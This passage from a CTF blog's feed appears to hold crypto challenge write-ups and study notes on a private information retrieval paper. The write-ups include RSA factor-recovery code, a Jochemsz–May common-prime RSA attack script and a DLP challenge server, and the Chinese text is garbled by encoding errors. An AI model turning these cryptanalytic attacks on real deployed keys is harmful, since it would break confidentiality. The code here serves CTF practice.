class="number">838904534475926157351308729240818407084954143783890603588577322003498109561730313914816741079988231626628323839347681718493076419655759210397234935526667</span>), (<span class="number">7934321504151848016580521002574844336171226047598370838640120531140912301800737265546469106621426048099833677640004660227767453182195309874035552908895749</span>, <span class="number">5362971084215426487776063906406933038339571667412402912065006500619578380006904603808786641086852920091627867874069854414757781438101918802034898550045331</span>, <span class="number">1748900714192807249109317611158943830937830460558493754638072787623072613667437058549182782275056393635453630420046451180946795578565976628109405510595851</span>), (<span class="number">7934321504151848016580521002574844336171226047598370838640120531140912301800737265546469106621426048099833677640004660227767453182195309874035552908895749</span>, <span class="number">12066875049186725037563076405509856102079254577708599600926787222480460395043678092209723790170304633936643796967312879841634722844075203775251723053087379</span>, <span class="number">8452804679164105798896330110261866894677513370854690443499853509483954628704210546950119931358508107480469559513289476607823736984539261601326230013637899</span>), (<span class="number">1230417539180549466793508503471921272431543137302174149778339809280030286763963777145531957537974334254817748546761634800890511776222024900818728405853701</span>, <span class="number">2430013099540483372244245938049404197953460394157816860687977434805442498428316202633376638362842795284433398895776030790499119572988606626252537829964435</span>, <span class="number">1329906716382101089747629329965011139454100278664981461584211492506767487727638715524124210457340661520140134851718762091766986740692646317283353979155723</span>), (<span class="number">1230417539180549466793508503471921272431543137302174149778339809280030286763963777145531957537974334254817748546761634800890511776222024900818728405853701</span>, <span class="number">9133917064511781922031258437152327261693143304454013549549758156666324513465089691034313787446294509129449327989019056217376060978961891599469362333006483</span>, <span class="number">8033810681353399639534641829067934203193783188961178150445992214367649502764412203925061359540792375365156063944961787518643928146665931290500178482197771</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p, q, d <span class="keyword">in</span> sol_list:</span><br><span class="line">    <span class="keyword">if</span> (n % p == <span class="number">0</span>):</span><br><span class="line">        q = n // p</span><br><span class="line">        d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">        m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line">    p, q = q, p</span><br><span class="line">    <span class="keyword">if</span> (n % p == <span class="number">0</span>):</span><br><span class="line">        q = n // p</span><br><span class="line">        d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">        m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line">    </span><br></pre></td></tr></table></figure><h3 id="common-rsa"><a href="#common-rsa" class="headerlink" title="common_rsa"></a>common_rsa</h3><p>ç»´çº³çš„common prime rsaï¼Œç”¨john and mayçš„æ–¹æ³•copperèƒ½å‡ºï¼Œä»£ç ç›´æ¥ç”¨githubçš„ï¼š<a href="https://github.com/jvdsn/crypto-attacks/blob/5c7989ceac599f1f8e016b5afb0d2966759cd470/attacks/rsa/wiener_attack_common_prime.py">https://github.com/jvdsn/crypto-attacks/blob/5c7989ceac599f1f8e016b5afb0d2966759cd470/attacks/rsa/wiener_attack_common_prime.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> log</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> RR</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> ZZ</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">path = os.path.dirname(os.path.dirname(os.path.dirname(os.path.realpath(os.path.abspath(__file__)))))</span><br><span class="line"><span class="keyword">if</span> sys.path[<span class="number">1</span>] != path:</span><br><span class="line">    sys.path.insert(<span class="number">1</span>, path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> shared.small_roots <span class="keyword">import</span> jochemsz_may_integer</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">N, e, delta=<span class="number">0.25</span>, m_start=<span class="number">1</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Recovers the prime factors of a modulus and the private exponent if the private exponent is too small (Common Prime RSA version).</span></span><br><span class="line"><span class="string">    More information: Jochemsz E., May A., &quot;A Strategy for Finding Roots of Multivariate Polynomials with New Applications in Attacking RSA Variants&quot; (Section 5)</span></span><br><span class="line"><span class="string">    :param N: the modulus</span></span><br><span class="line"><span class="string">    :param e: the public exponent</span></span><br><span class="line"><span class="string">    :param delta: a predicted bound on the private exponent (d &lt; N^delta) (default: 0.25)</span></span><br><span class="line"><span class="string">    :param m_start: the m value to start at for the small roots method (default: 1)</span></span><br><span class="line"><span class="string">    :return: a tuple containing the prime factors of the modulus and the private exponent</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    gamma = <span class="number">1</span> - log(e, N)</span><br><span class="line">    <span class="keyword">assert</span> delta &lt;= <span class="number">1</span> / <span class="number">4</span> * (<span class="number">4</span> + <span class="number">4</span> * gamma - sqrt(<span class="number">13</span> + <span class="number">20</span> * gamma + <span class="number">4</span> * gamma ** <span class="number">2</span>)), <span class="string">&quot;Bound check failed.&quot;</span></span><br><span class="line"></span><br><span class="line">    x, y, z = ZZ[<span class="string">&quot;x, y, z&quot;</span>].gens()</span><br><span class="line"></span><br><span class="line">    f = e ** <span class="number">2</span> * x ** <span class="number">2</span> + e * x * (y + z - <span class="number">2</span>) - (y + z - <span class="number">1</span>) - (N - <span class="number">1</span>) * y * z</span><br><span class="line"></span><br><span class="line">    X = <span class="built_in">int</span>(RR(N) ** delta)</span><br><span class="line">    Y = <span class="built_in">int</span>(RR(N) ** (delta + <span class="number">1</span> / <span class="number">2</span> - gamma))</span><br><span class="line">    Z = <span class="built_in">int</span>(RR(N) ** (delta + <span class="number">1</span> / <span class="number">2</span> - gamma))</span><br><span class="line">    W = <span class="built_in">int</span>(RR(N) ** (<span class="number">2</span> + <span class="number">2</span> * delta - <span class="number">2</span> * gamma))</span><br><span class="line"></span><br><span class="line">    m = m_start</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">            logging.info(<span class="string">f&quot;Trying m = <span class="subst">&#123;m&#125;</span>, t = <span class="subst">&#123;t&#125;</span>...&quot;</span>)</span><br><span class="line">            strategy = jochemsz_may_integer.ExtendedStrategy([t, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">            <span class="keyword">for</span> x0, y0, z0 <span class="keyword">in</span> jochemsz_may_integer.integer_multivariate(f, m, W, [X, Y, Z], strategy):</span><br><span class="line">                d = x0</span><br><span class="line">                ka = y0</span><br><span class="line">                kb = z0</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">pow</span>(<span class="built_in">pow</span>(<span class="number">2</span>, e, N), d, N) == <span class="number">2</span>:</span><br><span class="line">                    p = (e * d - <span class="number">1</span>) // kb + <span class="number">1</span></span><br><span class="line">                    q = (e * d - <span class="number">1</span>) // ka + <span class="number">1</span></span><br><span class="line">                    <span class="keyword">return</span> p, q, d</span><br><span class="line"></span><br><span class="line">        m += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">253784908428481171520644795825628119823506176672683456544539675613895749357067944465796492899363087465652749951069021248729871498716450122759675266109104893465718371075137027806815473672093804600537277140261127375373193053173163711234309619016940818893190549811778822641165586070952778825226669497115448984409</span></span><br><span class="line">e = <span class="number">31406775715899560162787869974700016947595840438708247549520794775013609818293759112173738791912355029131497095419469938722402909767606953171285102663874040755958087885460234337741136082351825063419747360169129165</span></span><br><span class="line">c = <span class="number">97724073843199563126299138557100062208119309614175354104566795999878855851589393774478499956448658027850289531621583268783154684298592331328032682316868391120285515076911892737051842116394165423670275422243894220422196193336551382986699759756232962573336291032572968060586136317901595414796229127047082707519</span></span><br><span class="line">delta = <span class="number">0.132</span></span><br><span class="line"><span class="built_in">print</span>(delta)</span><br><span class="line">p, q, d = attack(n, e, delta)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n))) </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="babyDLP"><a href="#babyDLP" class="headerlink" title="babyDLP"></a>babyDLP</h3><p>CryptoCTF ï¼ˆè¿™æ¯”èµ›å“¥ä»¬æ˜¯ç¬¬åä¸€åï¼‰åŸé¢˜sidestepï¼Œå‚æ•°äº¤äº’éƒ½æ²¡æ”¹ï¼Œç›´æ¥ç”¨åŸæ¥çš„expéƒ½èƒ½å‡ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random, sys</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow_d</span>(<span class="params">g, e, n</span>):</span></span><br><span class="line">    t, r = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">bin</span>(e)[<span class="number">2</span>:]:</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">4</span>: t += <span class="number">1</span></span><br><span class="line">        r = <span class="built_in">pow</span>(r, <span class="number">2</span>, n)</span><br><span class="line">        <span class="keyword">if</span> _ == <span class="string">&#x27;1&#x27;</span>: r = r * g % n</span><br><span class="line">    <span class="keyword">return</span> t, r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ts</span>(<span class="params">m, p</span>):</span></span><br><span class="line">    m = m % p</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(m, (p - <span class="number">1</span>) // <span class="number">2</span>, p) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">die</span>(<span class="params">*args</span>):</span></span><br><span class="line">    pr(*args)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pr</span>(<span class="params">*args</span>):</span></span><br><span class="line">    s = <span class="string">&quot; &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, args))</span><br><span class="line">    sys.stdout.write(s + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sc</span>():</span></span><br><span class="line">    <span class="keyword">return</span> sys.stdin.readline().strip()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    border = <span class="string">&quot;|&quot;</span></span><br><span class="line">    pr(border*<span class="number">72</span>)</span><br><span class="line">    pr(border, <span class="string">&quot;Hi all cryptographers! Welcome to the Sidestep task, we do powing!!!&quot;</span>, border)</span><br><span class="line">    pr(border, <span class="string">&quot;You should solve a DLP challenge in some special way to get the flag&quot;</span>, border)</span><br><span class="line"></span><br><span class="line">    p = <span class="number">2</span> ** <span class="number">1024</span> - <span class="number">2</span> ** <span class="number">234</span> - <span class="number">2</span> ** <span class="number">267</span> - <span class="number">2</span> ** <span class="number">291</span> - <span class="number">2</span> ** <span class="number">403</span> - <span class="number">1</span></span><br><span class="line">    s = random.randint(<span class="number">2</span>, (p - <span class="number">1</span>) // <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        pr(<span class="string">&quot;| Options: \n|\t[T]ry the magic machine \n|\t[Q]uit&quot;</span>)</span><br><span class="line">        ans = sc().lower()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ans == <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">            pr(border, <span class="string">&quot;please send your desired integer: &quot;</span>)</span><br><span class="line">            g = sc()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                g = <span class="built_in">int</span>(g)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                die(border, <span class="string">&quot;The given input is not integer!&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> ts(g, p):</span><br><span class="line">                t, r = pow_d(g, s, p)</span><br><span class="line">                <span class="keyword">if</span> r == <span class="number">4</span>:</span><br><span class="line">                    die(border, <span class="string">f&#x27;Great! you got the flag: <span class="subst">&#123;flag&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    pr(border, <span class="string">f&quot;t, r = <span class="subst">&#123;t, r&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                pr(border, <span class="string">&quot;The given base is NOT valid!!!&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> ans == <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">            die(border, <span class="string">&quot;Quitting ...&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            die(border, <span class="string">&quot;Bye bye ...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;ç¬¬äºŒæ¬¡å‚åŠ äº†ï¼Œæ—¶é—´å¥½å¿«å‘€&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://sh1k4ku.github.io/categories/CTF/"/>
    
    
    <category term="RSA" scheme="http://sh1k4ku.github.io/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>PIR</title>
    <link href="http://sh1k4ku.github.io/2022/08/03/2022/PIR/"/>
    <id>http://sh1k4ku.github.io/2022/08/03/2022/PIR/</id>
    <published>2022-08-03T02:22:08.000Z</published>
    <updated>2023-04-16T15:28:24.274Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Private Information Retrieval</strong></p><span id="more"></span><h1 id="introduction"><a href="#introduction" class="headerlink" title="introduction"></a>introduction</h1><p>Henry Corrigan-Gibbs and Dmitry KoganäºŒäººæå‡ºäº†ä¸€ä¸ªæ–°çš„PIRæ–¹æ¡ˆï¼Œä½¿å¾—å¤„ç†æ—¶é—´å˜ä¸ºäº†å¯¹æ•°å¤šé¡¹å¼/æ¬¡çº¿æ€§çº§åˆ«ï¼Œå¹¶ä¸”æ²¡æœ‰å¢åŠ å¼€é”€ã€‚</p><p><img src="/images/PIR/image-20220803103926186.png" alt="image-20220803103926186"></p><p><code>Our idea is to push the (necessary) linear-time server-side computation into a query-independent offlfflffline phase, which allows a subsequent online phase to complete in sublinear time</code></p><ol><li>In an <strong>offline</strong> phase, which takes place before the client has decided which bit of the database it wants to retrieve, the client fetches a one-time-use â€œhintâ€ from the database servers.</li><li>In a subsequent <strong>online</strong> phase, which takes place after the client has decided which bit of the database it wants to retrieve, the client sends a query to the database servers. Given the serversâ€™ answers to this query, along with the hint prefetched earlier, the client can recover its database bit of interest.</li></ol><h2 id="notation"><a href="#notation" class="headerlink" title="notation"></a>notation</h2><script type="math/tex; mode=display">N :  the\;set \;of \;positive \;integers\\n : the \;set \;{1, 2, . . . , n}\\1^n : é•¿åº¦ä¸ºnçš„å…¨ä¸º1çš„äºŒè¿›åˆ¶å­—ç¬¦\\s-subset of [n] : a\;subset\;of\;size\;exactly\;s\\\begin{pmatrix}[n]\\s\end{pmatrix}:the\;set\;of\;all\;s-subsets\;of\;[n]\\x\stackrel{R}{\longleftarrow}S: choosing\;x\;independently\;and\;uniformly\;at\; random\;from\;the\;set\;S\\x\stackrel{R}{\longleftarrow}D: choosing\;x âˆˆ S\; according \;to \;distribution \;D\\For\;p âˆˆ [0, 1],x\stackrel{R}{\longleftarrow}Bernoulli(p): choosing \;the \;bit \;b \;to\; be \;â€˜1â€™ \;with \;probability \;p \;and \;â€˜0â€™\; with \;probability \;1 âˆ’ p</script><h1 id="Puncturable-pseudorandom-sets"><a href="#Puncturable-pseudorandom-sets" class="headerlink" title="Puncturable pseudorandom sets"></a><strong>Puncturable pseudorandom sets</strong></h1><p>éå¸¸é‡è¦çš„ä¸€ä¸ªæ¦‚å¿µ</p><p>è¿˜æœ‰æœ¯è¯­â€œpuncturable pseudorandom functionï¼ˆpuncturable PRFï¼‰â€ and â€œpuncturable pseudorandom set(PRPs)â€</p><p>PRF keyä¸å‡½æ•°f: [n] -&gt; [n]å¯†åˆ‡ç›¸å…³</p><script type="math/tex; mode=display">a\;PRF\;key\;punctured \;at \;point\;x^âˆ— âˆˆ [n]\; allows \;its \;holder \;to \;evaluate \;f \;at \;every \;point \;in\; [n],\; \\except\; at\; the\;punctured\; point\; x^âˆ—</script><p>ä¹Ÿå°±æ˜¯è¯´punctured keyä¸èƒ½å¯¹å®ƒçš„æŒæœ‰è€…æ­ç¤ºä»»ä½•æœ‰å…³<script type="math/tex">f(x^*)</script>çš„ä¿¡æ¯</p><p>åŒæ ·çš„ï¼Œ the key for a puncturable pseudorandom set is a compressed representation of a pseudorandom set <em>S</em> <em>âŠ†</em> [<em>n</em>]. The set key punctured at element <script type="math/tex">x^âˆ— âˆˆ *S*</script>allows its holder to recover all elements of  <em>S</em> <em>except</em> the punctured element<script type="math/tex">x^âˆ—</script>. The punctured set key reveals nothing about <script type="math/tex">x^âˆ—</script>to its holder, apart from that fact that <script type="math/tex">x^âˆ—</script> is not one of the remaining elements in <em>S</em>.</p><h2 id="Defifinitions"><a href="#Defifinitions" class="headerlink" title="Defifinitions"></a><strong>Defifinitions</strong></h2><p>2.1éƒ¨åˆ†ä»‹ç»äº†ä¸‰ä¸ªé‡è¦ç®—æ³•</p><script type="math/tex; mode=display">è®¾s: N\rightarrow Nçš„å‡½æ•°æ»¡è¶³s(n)\leq n.\\A\;puncturable\; pseudorandom\;set \;with \;set \;size\; s\; consists\; of \;a\; key\; space \;K\\a \;punctured-key \;space\; K_p\\</script><p>ä¸‹é¢ä¸‰ä¸ªç®—æ³•ï¼š</p><ol><li><script type="math/tex; mode=display">Gen(1^\lambda,n)\rightarrow skï¼šä¼ å…¥\lambda å’Œsize nï¼Œè¾“å‡ºä¸€ä¸ªset \;key \;sk \in N</script></li><li><script type="math/tex; mode=display">Punc(sk, i)\rightarrow sk_pï¼šè¾“å…¥sk\in K å’Œi \in [n]ï¼Œè¾“å‡ºä¸€ä¸ªpunctured  \;set \; key  \;sk_p \in K_p</script></li><li><script type="math/tex; mode=display">Eval(skï¼‰\rightarrow Sï¼šè¾“å…¥key \in K \bigcup K_p, è¾“å‡ºä¸€ä¸ªé›†åˆS \subseteq [n]</script></li></ol><p><strong>æ•ˆç‡ï¼š</strong>å¯¹ä»»ä½•çš„å®‰å…¨å‚æ•°<script type="math/tex">\lambda \in N</script>ï¼Œä¸Šè¿°ä¸‰ä¸ªç®—æ³•ä»¥ <script type="math/tex">s(n) * poly(\lambda, log n)</script>çš„æ—¶é—´è¿è¡Œ</p><p><strong>æ­£ç¡®æ€§</strong>ï¼šå¯¹ä»»ä½•<script type="math/tex">\lambda , n \in N</script> ï¼Œè®¾å–æ ·<script type="math/tex">sk \leftarrow Gen(1^\lambda, n)</script>ï¼Œè®¡ç®—<script type="math/tex">S \leftarrow Eval(sk)</script>ï¼Œä¸€å®šæœ‰ä»¥ä¸‹ï¼š</p><ol><li><script type="math/tex; mode=display">S \in \begin{pmatrix}[n]\\s\end{pmatrix}</script></li><li><script type="math/tex; mode=display">å¯¹ä»»æ„i \in Sï¼ŒEval(Punc(sk, i)) = S \backslash \{i\}</script></li></ol><p><strong>å®‰å…¨æ€§</strong>ï¼šé¦–å…ˆå¼•å…¥Game 1</p><script type="math/tex; mode=display">Game \;1(Puncturable \;pseudorandom \;set \;security).\\For \;\lambda,n \in N, and \;a \;puncturable \;pseudorandom \;set\;\psi=(Gen, Punc, Eval)\\å®šä¹‰å¦‚ä¸‹åœ¨æŒ‘æˆ˜è€…å’Œå¯¹æ‰‹ä¹‹é—´çš„æ¸¸æˆï¼š\\-The\;challenger\;executes\;the \;following \;steps:\\\begin{align}\    &1.sk \leftarrow Gen(1^\lambda,n)&\\    &2.S \leftarrow Eval(sk)&\\    &3.x^*\stackrel{R}{\longleftarrow}S&\\    &4.sk_p\stackrel{R}{\longleftarrow}Punc(sk, x^*)&\\    å¹¶å°†1^\lambdaå’Œsk_på‘é€ç»™å¯¹æ‰‹ã€‚\\-å¯¹æ‰‹è¾“å‡ºä¸€ä¸ªæ•´æ•°x^{'} \in [n]\\å¦‚æœx^{'} = x^*åˆ™è®¤ä¸ºå¯¹æ‰‹è·èƒœ\end{align}</script><p><img src="/images/PIR/image-20220803131344272.png" alt="image-20220803131344272"></p><p>è¿™é‡Œæ²¡å¤ªçœ‹æ‡‚ã€‚ã€‚</p><h2 id="Constructions"><a href="#Constructions" class="headerlink" title="Constructions"></a><strong>Constructions</strong></h2><p>å…³äº2.2éƒ¨åˆ†ï¼Œä¸ªäººçš„æµ…è–„ç†è§£æ˜¯ç»™å‡ºäº†ä¸€äº›å­˜åœ¨æ€§çš„è¯æ˜ï¼Œå¦‚ä¸‹æ‰€è¿°ã€‚</p><script type="math/tex; mode=display">Fact\;2 \;(Perfectly \;secure \;puncturable \;pseudorandom\; set with\; linear-sized\; keys):\\å¯¹ä»»ä½•å‡½æ•°s:N \rightarrow N \;with\;s(n) \leqslant n,\;æ€»æœ‰ä¸€ä¸ªperfectly \;secure\; puncturable\; pseudorandom \;set \;with \;set \;size \;s\\ä»¥åŠï¼Œå¯¹ç¡®å®šçš„næ¥è¯´ï¼Œthe \;set\; keys \;and \;punctured\; keys\;çš„å¤§å°éƒ½æ˜¯(s(n)+O(1))log\;n bits</script><script type="math/tex; mode=display">\begin{align}\&Theorem \;3 \;(puncturable\; pseudorandom\; set\; with\; short \;keys \;from\; puncturable\; PRFs):&\\&\quadå‡è®¾å­˜åœ¨ä¸€ä¸ª\epsilon_F-secure\;puncturable\;PRF,å®ƒå¯¹äºå®‰å…¨çš„å‚æ•°\lambdaå’Œè¾“å…¥çš„n,æœ‰é•¿åº¦ä¸º\kappa(\lambda,n)çš„keyså’Œé•¿åº¦ä¸º\kappa_p(\lambda,n)&\\&\quadçš„punctured\;keys,é‚£ä¹ˆå­˜åœ¨ä¸€ä¸ªå¤§å°ä¸º\Theta(\sqrt{n})çš„\epsilon-secure \;puncturable \;pseudorandom \;setï¼Œå¯¹äº\lambdaå’Œnï¼Œæœ‰ï¼š&\\    &\qquad1.set\; keys\; of\; length\; Îº(Î», n) + O(log \;n)\; bits\; and&\\    &\qquad2.punctured\; keys\; of \;length\; Îº_p(Î», n) + O(log \;n)\; bits, and&\\    &\qquad3.\epsilon(Î», n) = poly(Î», n) Â· ( \epsilon_F + 2^{âˆ’Î»}).&\\\end{align}</script><p>ç„¶åæ„é€ äº†ä¸€ä¸ªpuncturable pseudorandom setæ¥è¯æ˜ä¸Šè¿°Theoremï¼š</p><script type="math/tex; mode=display">Construction\;4 \;(Puncturable\; pseudorandom \;set \;from \;puncturable \;PRF).\\Given\; a \;puncturable\; PRF \;F = (PRFGen, PRFPunc, PRFEval),\\we\; construct \;a \;puncturable \;pseudorandom\; set \;\psi_F = (Gen, Punc, Eval)\;with\; set \;size\; s(n) \;:= \frac{\sqrt{n}}{2}\\\begin{align}\&\psi_F.Gen(1^\lambda, n) \rightarrow sk& \\    &\quad-é‡å¤ä»¥ä¸‹æœ€å¤š\lambdaæ¬¡ï¼š&\\        &\qquad Â·k \leftarrow PRFGen(1^\lambda,    n).&\\        &\qquad Â·è®¡ç®—S \leftarrow {PRFEval(k,1),PRFEval(k,2),Â·Â·Â·ï¼ŒPRFEval(k,s(n))}&\\        &\qquad Â·å¦‚æœ|S| = s(n),åœæ­¢å¹¶è¾“å‡ºsk \leftarrow(n,k).è¾“å‡ºâŠ¥ï¼ˆè¿™é‡Œæ²¡æ‡‚ï¼Œè¾“å‡ºå‚ç›´ï¼Ÿï¼‰&\\    &\quad-åœ¨è¿è¡Œ\lambdaæ¬¡åå¾ªç¯ä¸æˆåŠŸï¼Œè¾“å‡ºâŠ¥&\\\\&\psi_F.Punc(sk,i) \rightarrow sk_p& \\    &\quad-å°†å¯†é’¥è§£ææˆ(n, k).&\\    &\quad-æ‰¾åˆ°æœ€å°çš„læ»¡è¶³PRFEval(k,l)=i.&\\        &\qquad\;å¦‚æœä¸å­˜åœ¨è¿™æ ·çš„lï¼Œè¾“å‡ºâŠ¥&\\    &\quad-è®¡ç®—k_p \leftarrow PRFPunc(k,l),å¹¶è¾“å‡ºsk_p \leftarrow (n,k_p).&\\\\&\psi_F.Eval(sk) \rightarrow S& \\    &\quad-å°†å¯†é’¥è§£ææˆ(n,k).&\\    &\quad-è¾“å‡ºé›†åˆS \leftarrow {PRFEval(k,1),PRFEval(k,2),Â·Â·Â·ï¼ŒPRFEval(k,s(n))}.&\\    &\quad-(If \;k\; is\; punctured \;at\; some \;value, \;skip\; this \;value\; when\; computing\; S).&\\\end{align}</script><p>æ³¨æ„ï¼šGenå¤±è´¥çš„æ¦‚ç‡å¾ˆå°ï¼Œä½†ä¸ä»£è¡¨ä¸ä¼šå¤±è´¥ï¼Œæˆ‘ä»¬å¯ä»¥è®©sk=âŠ¥æ˜¯æŸäº›å›ºå®šçš„é›†åˆï¼ˆä¾‹å¦‚[s])æ¥ä¿è¯ä¸Šè¿°theoremå®Œå…¨æ­£ç¡®ã€‚</p><script type="math/tex; mode=display">Corollary\;6. \;Assuming\; that \;pseudorandom \;generators\; (PRGs)\; exist,\\ there \;exists\;\;a \;secure \;puncturable\; pseudorandom \;set\; with \;set \;size\; Î˜(\sqrt{n})</script><p>theorem 7å¼•å…¥äº†ä¸€ä¸ªfast membership testingçš„æ¦‚å¿µï¼Œæ¶‰åŠåˆ°ä¸€ä¸ªInSetå‡½æ•°ï¼Œè¿è¡Œé€Ÿåº¦æ˜¯polyçš„ï¼Œå…¶å®å°±æ˜¯åˆ¤æ–­iæ˜¯å¦åœ¨PRPs.Eval(sk)ä¸­ï¼Œä¸å±•å¼€å†™äº†ã€‚</p><h2 id="Shifting-puncturable-pseudorandom-sets"><a href="#Shifting-puncturable-pseudorandom-sets" class="headerlink" title="Shifting puncturable pseudorandom sets"></a><strong>Shifting puncturable pseudorandom sets</strong></h2><p>å¼•å…¥äº†ä¸¤ä¸ªPRPsçš„æ€§è´¨ï¼š</p><script type="math/tex; mode=display">\begin{align*}&1.GenWith(1^\lambda,n,i) \rightarrow 